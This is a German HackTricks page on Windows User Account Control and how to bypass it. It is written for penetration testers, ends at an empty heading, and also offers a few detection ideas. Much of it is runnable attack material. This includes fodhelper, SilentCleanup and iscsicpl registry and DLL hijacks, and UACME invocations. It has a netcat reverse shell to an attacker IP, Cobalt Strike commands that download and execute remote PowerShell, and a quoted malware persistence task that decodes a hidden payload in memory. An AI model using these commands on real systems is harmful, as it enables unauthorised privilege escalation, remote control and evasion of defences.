# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsabfrage für Aktionen mit erhöhten Rechten** ermöglicht. Anwendungen verfügen über unterschiedliche `integrity`-Stufen, und ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die das **System potenziell gefährden könnten**. Wenn UAC aktiviert ist, **werden Anwendungen und Aufgaben immer im Sicherheitskontext eines Nicht-Administratorkontos ausgeführt**, es sei denn, ein Administrator autorisiert diese Anwendungen bzw. Aufgaben ausdrücklich, Administratorzugriff auf das System zu erhalten. Es handelt sich um eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, aber nicht als Sicherheitsgrenze betrachtet wird.<sup>[[2]](#references)</sup>

Weitere Informationen zu Integritätsstufen:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiv ist, erhält ein Benutzer mit Administratorrechten 2 Tokens: ein Standardbenutzer-Token für reguläre Aktionen mit mittlerer Integrität und eines mit den Administratorrechten.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) erläutert ausführlich, wie UAC funktioniert, und umfasst den Anmeldevorgang, die Benutzererfahrung und die UAC-Architektur.<sup>[[2]](#references)</sup> Administratoren können Sicherheitsrichtlinien verwenden, um die Funktionsweise von UAC auf lokaler Ebene für ihre Organisation zu konfigurieren (mit secpol.msc) oder sie in einer Active-Directory-Domänenumgebung über Group Policy Objects (GPO) zu konfigurieren und bereitzustellen. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich erläutert. Für UAC können 10 Group-Policy-Einstellungen festgelegt werden. Die folgende Tabelle enthält weitere Details:

| Group-Policy-Einstellung                                                                                                                                                                                                                                                                                                                                                           | Registrierungsschlüssel                | Standardeinstellung                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deaktiviert)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zustimmungsabfrage für Nicht-Windows-Binärdateien auf dem sicheren Desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Abfrage von Anmeldedaten auf dem sicheren Desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Aktiviert; in Enterprise standardmäßig deaktiviert)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deaktiviert)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Aktiviert)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Aktiviert)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deaktiviert)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Aktiviert)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Aktiviert)                                              |

### Richtlinien für die Installation von Software unter Windows

Die **lokalen Sicherheitsrichtlinien** ("secpol.msc" auf den meisten Systemen) sind standardmäßig so konfiguriert, dass sie **Nicht-Administratoren an der Durchführung von Softwareinstallationen hindern**. Das bedeutet, dass ein Nicht-Administrator den Installer deiner Software zwar herunterladen kann, ihn aber ohne ein Administratorkonto nicht ausführen kann.

### Registrierungsschlüssel, die UAC zur Abfrage einer Erhöhung zwingen

Als Standardbenutzer ohne Administratorrechte kannst du sicherstellen, dass das "Standardkonto" **von UAC zur Eingabe von Anmeldedaten aufgefordert wird**, wenn es versucht, bestimmte Aktionen auszuführen. Dafür müssen bestimmte **Registrierungsschlüssel** geändert werden. Dazu benötigst du Administratorrechte, es sei denn, es gibt einen **UAC bypass** oder der Angreifer ist bereits als Administrator angemeldet.

Selbst wenn sich der Benutzer in der Gruppe **Administratoren** befindet, zwingen diese Änderungen den Benutzer dazu, seine **Kontodaten erneut einzugeben**, um administrative Aktionen auszuführen.

**In der Praxis ist dies nur nützlich, wenn du bereits über ein Token mit erhöhten Rechten, einen UAC bypass oder eine Fehlkonfiguration verfügst, die das Ändern dieser Schlüssel ermöglicht; andernfalls wird der Schreibzugriff auf die Registrierung selbst blockiert.**

Die Registrierungsschlüssel und Einträge, die du ändern musst, sind folgende (mit ihren Standardwerten in Klammern):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dies kann auch manuell über das Tool für lokale Sicherheitsrichtlinien durchgeführt werden. Nach der Änderung wird der Benutzer bei administrativen Vorgängen aufgefordert, seine Anmeldedaten erneut einzugeben.

### Hinweis

**User Account Control ist keine Sicherheitsgrenze.** Daher können Standardbenutzer ihre Konten nicht verlassen und Administratorrechte erlangen, ohne einen local privilege escalation exploit zu verwenden.

### Einen Benutzer nach "vollständigem Computerzugriff" fragen
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC-Berechtigungen

- Der geschützte Modus von Internet Explorer verwendet Integritätsprüfungen, um zu verhindern, dass Prozesse mit hoher Integritätsstufe (wie Webbrowser) auf Daten mit niedriger Integritätsstufe (wie den Ordner für temporäre Internetdateien) zugreifen. Dies wird erreicht, indem der Browser mit einem Token mit niedriger Integritätsstufe ausgeführt wird. Wenn der Browser versucht, auf in der Zone mit niedriger Integritätsstufe gespeicherte Daten zuzugreifen, überprüft das Betriebssystem die Integritätsstufe des Prozesses und gewährt den Zugriff entsprechend. Diese Funktion hilft dabei, Remote-Code-Execution-Angriffe daran zu hindern, auf sensible Daten im System zuzugreifen.
- Wenn sich ein Benutzer bei Windows anmeldet, erstellt das System ein Zugriffstoken, das eine Liste der Berechtigungen des Benutzers enthält. Berechtigungen werden als Kombination aus den Rechten und Fähigkeiten eines Benutzers definiert. Das Token enthält außerdem eine Liste der Anmeldedaten des Benutzers. Dabei handelt es sich um Anmeldedaten, die zur Authentifizierung des Benutzers am Computer und bei Ressourcen im Netzwerk verwendet werden.

### Autoadminlogon

Um Windows so zu konfigurieren, dass beim Start automatisch ein bestimmter Benutzer angemeldet wird, setzen Sie den **Registrierungsschlüssel `AutoAdminLogon`**. Dies ist für Kiosk-Umgebungen oder Testzwecke nützlich. Verwenden Sie dies nur auf sicheren Systemen, da das Kennwort dadurch in der Registrierung offengelegt wird.

Setzen Sie die folgenden Schlüssel mit dem Registrierungs-Editor oder `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Um das normale Anmeldeverhalten wiederherzustellen, setzen Sie `AutoAdminLogon` auf 0.

## UAC bypass

> [!TIP]
> Beachten Sie, dass UAC bypass unkompliziert ist, wenn Sie grafischen Zugriff auf das Opfer haben, da Sie einfach auf „Ja“ klicken können, sobald die UAC-Eingabeaufforderung erscheint.

UAC bypass wird in der folgenden Situation benötigt: **UAC ist aktiviert, Ihr Prozess läuft in einem Kontext mit mittlerer Integritätsstufe und Ihr Benutzer gehört zur Administratorengruppe**.

Es ist wichtig zu erwähnen, dass es **deutlich schwieriger ist, UAC zu umgehen, wenn die höchste Sicherheitsstufe (Always) aktiviert ist, als bei einer der anderen Stufen (Default).**

### Fast triage from a medium-integrity shell

Bevor Sie einen Bypass versuchen, bestätigen Sie, dass Sie sich im richtigen Szenario befinden, und ordnen Sie den Host-Build bekannten funktionierenden Methoden zu:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktische Hinweise:
- Wenn `EnableLUA=0` gesetzt ist, benötigen Sie keinen Bypass: Jedes Admin-Token kann direkt eine hohe Integrität anfordern.
- `ConsentPromptBehaviorAdmin=2` oder `5` ist das häufige Szenario für Auto-Elevate- / COM-basierte Bypasses.
- `Always Notify` erhöht die Hürde, aber Sie sollten trotzdem den exakten Build testen, anstatt von einem Fehlschlag auszugehen: UACME führt weiterhin einige mit `AlwaysNotify compatible` kompatible Methoden auf modernen Windows-Builds.<sup>[[3]](#references)</sup>

### UAC deaktiviert

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), können Sie eine **Reverse Shell mit Admin-Berechtigungen** (hohe Integritätsstufe) beispielsweise wie folgt **ausführen**:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** grundlegender UAC-„bypass“ (vollständiger Zugriff auf das Dateisystem)

Wenn du eine shell mit einem Benutzer hast, der Mitglied der Gruppe Administrators ist, kannst du die über SMB (file system) freigegebene **C$-Freigabe** lokal auf einem neuen Laufwerk mounten und erhältst **Zugriff auf alles innerhalb des Dateisystems** (sogar auf den Home-Ordner von Administrator).

> [!WARNING]
> **Sieht so aus, als würde dieser Trick nicht mehr funktionieren**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with Cobalt Strike

The Cobalt Strike techniques funktionieren nur, wenn UAC nicht auf die höchste Sicherheitsstufe eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** verfügen ebenfalls über mehrere Module zum **Umgehen** der **UAC**.

### Erhöhte COM-Schnittstellen (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM-Objekte bleiben auf aktuellen Builds eine praktische UAC-Angriffsfläche. `ICMLuaUtil` wird von UACME weiterhin als auf aktuellen Windows-Zweigen funktionierend geführt, und offensive Tools passen `CMSTPLUA` weiterhin an, indem sie einen interaktiven Desktop-Prozess, die 64-bit-Ausführung und manchmal PEB-/Prozess-Masquerading kombinieren, bevor sie den COM Elevation Moniker aufrufen.<sup>[[3]](#references)</sup>

Praktische Tipps:
- Bevorzuge einen **64-bit**-Prozess in der **interaktiven Sitzung** des Benutzers (üblicherweise `explorer.exe` oder ein untergeordneter Prozess davon).
- Wenn eine direkte Shell fehlschlägt, versuche es erneut aus einer BOF- / UACME-Implementierung statt mit einem naiven `CreateProcess`-Wrapper.
- Gehe davon aus, dass die Ausführung des Child-Prozesses in einem **separaten erhöhten Prozess** erfolgt; viele BOFs erhöhen den aktuellen Beacon nicht direkt.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) ist eine Sammlung von UAC bypass techniques. Kompiliere es mit Visual Studio oder MSBuild; der Build erstellt mehrere ausführbare Dateien (zum Beispiel `Source\Akagi\output\x64\Debug\Akagi.exe`), wähle daher die für den Ziel-Build geeignete Methode aus.<sup>[[3]](#references)</sup>\
Sei vorsichtig: Einige Bypasses starten sichtbare Programme oder Eingabeaufforderungen, die den Benutzer alarmieren können.<sup>[[3]](#references)</sup>

UACME enthält die **Build-Version, ab der jede technique zu funktionieren begann**.<sup>[[3]](#references)</sup> Du kannst nach einer technique suchen, die deine Versionen betrifft:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Außerdem erhältst du mithilfe [dieser](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite das Windows-Release `1607` aus den Build-Versionen.

Ein praktischer Workflow besteht darin, zunächst den **Host-Build zu bewerten** und erst danach die passende Methode auszuführen:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` vergleicht den lokalen Build schnell mit seinen bekannten UAC-Methoden, was nützlich ist, um nicht mehr funktionierende PoCs zügig auszusortieren.<sup>[[4]](#references)</sup>
- `UACME` bleibt der beste öffentliche Katalog, um einen Bypass einem bestimmten Build zuzuordnen. Version 3.7.1 fügte die Methoden 83–85 hinzu, während die vorherige Version bestehende Methoden erneut gegen **Windows 11 25H2** testete. Prüfe die Methodentabelle und die Release Notes erneut, statt anzunehmen, dass ein alter PoC unverändert weiterhin funktioniert.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify-fähige WNF/UIAccess-Ketten (UACME 3.7.1)

`Always Notify` verhindert nicht jeden UAC bypass. UACME 3.7.1 implementiert drei neue x64-Methoden, die einen vom Benutzer kontrollierten Umgebungs-/Protokollstatus mit dem Verhalten privilegierter geplanter Tasks oder UIAccess kombinieren, und kennzeichnet alle als `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** Leite `SystemRoot` um, sodass die durch WNF ausgelöste `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` das privilegierte `taskhostw.exe` dazu bringt, `unifiedconsent.dll` per side-load zu laden. UACME führt die Methode ab Windows 10 Build 19041.
- **84 — TabTip:** Verwende dasselbe Primitive für Umgebungsvariablen gegen das UIAccess-Programm `TabTip.exe`, das je nach Build `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` oder `rsaenh.dll` lädt, und führe anschließend einen Pivot aus dem resultierenden UIAccess-Kontext mit hoher Integrität durch. UACME führt die Methode ab Windows 8.1 / Server 2016.
- **85 — Narrator:** Übernimm das benutzerbezogene `feedback-hub`-Protokoll, steuere Narrator mit `Alt+CapsLock+F` und starte anschließend eine beschreibbare Kopie von `osk.exe`, die `OskSupport.dll` per side-load lädt. Dies erfordert einen interaktiven Desktop und wird ab Windows 10 1809 / Server 2019 geführt.

Nachdem du die Payload-Einheiten und Akagi wie von UACME dokumentiert erstellt hast, rufe die entsprechende Methodennummer auf (der optionale Befehl ist standardmäßig `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methoden 84 und 85 hängen von UIAccess/Desktop-Interaktion ab. Daher sollte nicht erwartet werden, dass sie unverändert aus Session 0 oder einer nicht interaktiven Service-Shell funktionieren. Alle drei manipulieren den Umgebungs-/Protokollstatus und legen DLLs ab. Untersuche die Implementierung und entferne diese Artefakte nach dem Testen.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry-Hijacking)

Die vertrauenswürdige Binärdatei `fodhelper.exe` wird unter modernen Windows-Versionen automatisch mit erhöhten Rechten ausgeführt. Beim Start fragt sie den folgenden benutzerspezifischen Registry-Pfad ab, ohne das Verb `DelegateExecute` zu validieren. Wird dort ein Befehl platziert, kann ein Prozess mit Medium Integrity (der Benutzer befindet sich in der Gruppe der Administratoren) ohne UAC-Eingabeaufforderung einen Prozess mit High Integrity starten.

Vom fodhelper abgefragter Registry-Pfad:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-Schritte (Payload festlegen, dann auslösen)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notizen:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Gruppe Administrators ist und die UAC-Einstellung auf dem Standardwert bzw. auf einer weniger restriktiven Stufe steht (nicht auf Always Notify mit zusätzlichen Einschränkungen).
- Verwende den Pfad `sysnative`, um eine 64-Bit-PowerShell aus einem 32-Bit-Prozess unter 64-Bit-Windows zu starten.
- Der Payload kann ein beliebiger Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide für mehr Stealth auffällige UIs.

#### CurVer/extension hijack-Variante (nur HKCU)

Aktuelle Samples, die `fodhelper.exe` missbrauchen, umgehen `DelegateExecute` und leiten stattdessen die `ms-settings`-ProgID über den benutzerbezogenen `CurVer`-Wert um. Das auto-elevated Binary löst den Handler weiterhin unter `HKCU` auf, sodass kein Admin-Token benötigt wird, um die Schlüssel anzulegen:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nach der Rechteerweiterung **deaktiviert** Malware häufig **zukünftige Eingabeaufforderungen**, indem sie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` auf `0` setzt. Anschließend führt sie zusätzliche Defense Evasion durch (z. B. `Add-MpPreference -ExclusionPath C:\ProgramData`) und stellt die Persistence wieder her, um mit hoher Integrität ausgeführt zu werden. Eine typische Persistence-Aufgabe speichert ein **XOR-encrypted PowerShell script** auf der Festplatte und decodiert und führt es jede Stunde im Arbeitsspeicher aus:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Diese Variante bereinigt weiterhin den Dropper und hinterlässt nur die gestagten Payloads. Dadurch muss die Erkennung auf die Überwachung des **`CurVer`-Hijacks**, der Manipulation von `ConsentPromptBehaviorAdmin`, der Erstellung von Defender-Ausschlüssen oder von Scheduled Tasks setzen, die PowerShell im Speicher entschlüsseln.<sup>[[5]](#references)</sup>

### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup` startet `cleanmgr.exe` mit höchsten Privilegien und erweitert `%windir%` aus der Benutzerumgebung. Wenn du `HKCU\Environment\windir` kontrollierst, kannst du diese Erweiterung auf einen beliebigen Befehl umleiten und ohne Consent-Dialog eine hohe Integrität erlangen.<sup>[[8]](#references)</sup> Diese Methode ist auf aktuellen Builds weiterhin einen Test wert, da UACME die Technik weiterhin aktiv hält und das aktuelle Issue-Tracking zeigt, dass Windows 11 24H2 möglicherweise nur geringfügige Anpassungen bei der Quoting-Syntax erfordert.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Wenn die Aufgabe den Pfad auf diesem Build in Anführungszeichen setzt, wiederhole den Vorgang mit einem Payload, der mit einem Anführungszeichen endet (z. B. `cmd.exe"`). Bereinige `HKCU\Environment\windir` nach dem Test immer.

#### Weiterer UAC bypass

Viele klassische UAC bypasses, die UI-Abläufe, COM objects oder Desktop-Interaktion missbrauchen, erfordern eine **vollständige interaktive Sitzung** mit dem Opfer; eine gewöhnliche `nc.exe`-Shell oder ein in **Session 0** laufender Service reicht oft nicht aus.

Das lässt sich häufig mit einer **meterpreter**-Sitzung lösen. Migriere zu einem **process**, dessen **Session**-Wert gleich **1** ist:

![ms-settings auf eine benutzerdefinierte Erweiterung (.thm) verweisen und diese Erweiterung unserem Payload zuordnen – Weiterer UAC bypass: Dies ist mit einer meterpreter-Sitzung möglich. Migriere zu einem process, dessen Session...](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC Bypass mit GUI

Wenn du Zugriff auf eine **GUI** hast, kannst du die UAC-Abfrage einfach **akzeptieren**, sobald sie erscheint; du benötigst keinen technischen bypass. Daher reicht eine GUI-Sitzung oft aus, um die praktischen Einschränkungen durch UAC zu umgehen.

Wenn du außerdem eine GUI-Sitzung erhältst, die jemand verwendet hat (möglicherweise über RDP), werden darin möglicherweise **einige Tools als Administrator ausgeführt**, über die du beispielsweise direkt einen **cmd** **als admin ausführen** kannst, ohne erneut von UAC aufgefordert zu werden, wie bei [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dies könnte etwas **unauffälliger** sein.

### Lauter Brute-Force-UAC-bypass

Wenn das Erzeugen von Geräuschen akzeptabel ist, kann ein Tool wie [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) wiederholt eine Erhöhung der Berechtigungen anfordern, bis der Benutzer sie akzeptiert.

### Dein eigener bypass – grundlegende UAC-bypass-Methodik

Wenn du dir **UACME** ansiehst, wirst du feststellen, dass **viele UAC bypasses DLL hijacking missbrauchen** (häufig, indem ein privilegiertes Binary eine vom Angreifer kontrollierte DLL aus einem beschreibbaren Pfad lädt). [Lies dies, um zu erfahren, wie du eine DLL-hijacking-Schwachstelle findest](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde ein Binary, das **autoelevate** (überprüfe, ob es bei der Ausführung auf einer hohen Integritätsstufe läuft).
2. Finde mit procmon Ereignisse vom Typ "**NAME NOT FOUND**", die für **DLL Hijacking** anfällig sein können.
3. Wahrscheinlich musst du die DLL in einige **geschützte Pfade** (wie C:\Windows\System32) **schreiben**, für die du keine Schreibberechtigungen hast. Dies kannst du wie folgt umgehen:
1. **wusa.exe**: Windows 7, 8 und 8.1. Damit kann der Inhalt einer CAB-Datei in geschützte Pfade extrahiert werden (weil dieses Tool auf einer hohen Integritätsstufe ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Bereite ein **script** vor, das deine DLL in den geschützten Pfad kopiert und das anfällige und autoelevated Binary ausführt.

### Eine weitere UAC-bypass-Technik

Dabei wird überprüft, ob ein **autoElevated binary** versucht, aus der **registry** den **Namen/Pfad** eines **Binarys** oder **Commands** zu **lesen**, das **ausgeführt** werden soll (besonders interessant ist dies, wenn das Binary diese Informationen in der **HKCU** sucht).

### UAC bypass über `SysWOW64\iscsicpl.exe` + DLL hijack über den Benutzer-`PATH`

Das 32-Bit-`C:\Windows\SysWOW64\iscsicpl.exe` ist ein **auto-elevated** Binary, das missbraucht werden kann, um `iscsiexe.dll` anhand der Suchreihenfolge zu laden. Wenn du eine bösartige `iscsiexe.dll` in einem **vom Benutzer beschreibbaren** Ordner platzieren und anschließend den `PATH` des aktuellen Benutzers ändern kannst (beispielsweise über `HKCU\Environment\Path`), sodass dieser Ordner durchsucht wird, lädt Windows möglicherweise die Angreifer-DLL in den Prozess des privilegierten `iscsicpl.exe`, **ohne eine UAC-Abfrage anzuzeigen**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktische Hinweise:
- Dies ist nützlich, wenn der aktuelle Benutzer Mitglied der **Administrators** ist, aber aufgrund von UAC mit **Medium Integrity** ausgeführt wird.
- Die Kopie unter **SysWOW64** ist für diesen bypass relevant. Behandle die Kopie unter **System32** als separates Binary und überprüfe das Verhalten unabhängig.
- Das Primitive ist eine Kombination aus **auto-elevation** und **DLL search-order hijacking**. Daher ist derselbe ProcMon-Workflow wie bei anderen UAC bypasses nützlich, um das Laden der fehlenden DLL zu überprüfen.

Minimaler Ablauf:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Erkennungsideen:
- Auf `reg add` / Registry-Schreibvorgänge in `HKCU\Environment\Path` alerten, die unmittelbar von der Ausführung von `C:\Windows\SysWOW64\iscsicpl.exe` gefolgt werden.
- Nach `iscsiexe.dll` an **benutzergesteuerten** Speicherorten wie `%TEMP%` oder `%LOCALAPPDATA%\Microsoft\WindowsApps` suchen.
- Starts von `iscsicpl.exe` mit unerwarteten Child-Prozessen oder DLL-Ladevorgängen außerhalb der normalen Windows-Verzeichnisse korrelieren.

### Neuere Forschung, die separat geprüft werden sollte

